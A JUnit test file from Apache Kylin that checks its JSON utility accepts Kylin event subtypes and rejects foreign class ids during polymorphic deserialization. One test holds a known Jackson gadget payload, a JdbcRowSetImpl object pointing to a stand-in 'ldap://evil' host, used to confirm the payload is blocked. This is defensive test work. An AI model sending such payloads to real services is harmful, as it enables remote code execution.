/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.kylin.common.util;

import org.apache.kylin.common.persistence.event.Event;
import org.apache.kylin.common.persistence.event.ResourceDeleteEvent;
import org.junit.Assert;
import org.junit.jupiter.api.Test;

import com.fasterxml.jackson.databind.exc.InvalidTypeIdException;

public class JsonUtilPolymorphicTypeTest {

    @Test
    public void testKylinEventSubTypeAllowed() throws Exception {
        String json = JsonUtil.writeValueAsString(new ResourceDeleteEvent("PROJECT/p1"));
        Event event = JsonUtil.readValue(json, Event.class);
        Assert.assertTrue(event instanceof ResourceDeleteEvent);
    }

    @Test
    public void testNonKylinClassIdRejected() {
        String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil/x\"}";
        Assert.assertThrows(InvalidTypeIdException.class, () -> JsonUtil.readValue(json, Event.class));
    }
}
